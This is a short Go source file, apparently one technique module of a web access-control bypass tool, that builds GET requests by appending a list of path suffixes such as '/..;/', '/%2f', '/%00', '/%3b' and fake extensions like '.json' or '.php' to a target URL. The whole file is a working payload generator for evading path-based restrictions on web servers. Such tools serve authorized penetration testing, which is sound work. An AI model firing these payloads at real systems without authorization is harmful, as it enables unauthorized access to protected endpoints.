package techniques

import "strings"

func (EndPaths) Name() string { return "endpaths" }

type EndPaths struct{}

func (EndPaths) Generate(ctx Context) []Payload {
    suffixes := []string{
        "/", "//", "/.", "/./", "/.//", "/..", "/../", "/..;/", "/.;/",
        "/;/", "//;//", "/%2f", "/%2f/", "/%20", "/%09", "/%0a", "/%0d",
        "/%00", "/%23", "/%3f", "/%5c", "/%5c%5c", "/.json", ".json",
        "/.css", ".css", "/.html", ".html", "/.php", ".php", "/.asp",
        ".asp", "/.jsp", ".jsp", "/.txt", ".txt", "/?", "/?/", "/??/",
        "/?x=1", "/~", "/-", "/*", "/&", "/#", "/;", "/%3b",
    }
    var out []Payload
    for _, s := range suffixes {
        out = append(out, Payload{
            Method:      "GET",
            URL:         ctx.Target + s,
            Description: "Suffix: " + s,
            Detail:      strings.TrimPrefix(ctx.Target, "http") + s,
            Technique:   "endpaths",
        })
    }
    return out
}